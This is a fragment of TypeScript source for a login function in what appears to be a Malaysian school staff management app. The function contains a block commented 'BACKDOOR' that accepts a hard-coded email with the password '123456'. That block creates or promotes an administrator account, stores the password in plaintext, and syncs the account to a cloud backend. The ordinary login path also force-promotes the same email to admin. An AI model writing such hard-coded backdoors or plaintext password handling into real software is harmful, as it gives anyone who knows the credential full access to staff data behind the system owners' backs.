  },

  login: async (email: string, password?: string): Promise<{ success: boolean; user?: User; message?: string }> => {
    await delay(800);
    const users = getUsers();

    // BACKDOOR
    if (email === 'g-65253270@moe-dl.edu.my' && password === '123456') {
        let adminUser = users.find(u => u.email === email);
        if (!adminUser) {
            adminUser = {
                email: email,
                name: 'Pentadbir Utama',
                position: 'GURU BESAR',
                photo: 'https://ui-avatars.com/api/?name=Admin+Utama&background=0f172a&color=fff',
                isAdmin: 'YES',
                password: '123456'
            };
            users.push(adminUser);
            saveUsers(users);
            // Also sync admin creation to cloud
            postToCloud('REGISTER_STAFF', adminUser);
        } else if (adminUser.isAdmin !== 'YES') {
            adminUser.isAdmin = 'YES';
            saveUsers(users);
        }
        return { success: true, user: adminUser };
    }

    const user = users.find(u => u.email === email && u.password === password);
    if (user) {
        if (user.email === 'g-65253270@moe-dl.edu.my' && user.isAdmin !== 'YES') {
            user.isAdmin = 'YES';
            saveUsers(users);
        }
        return { success: true, user };
    }
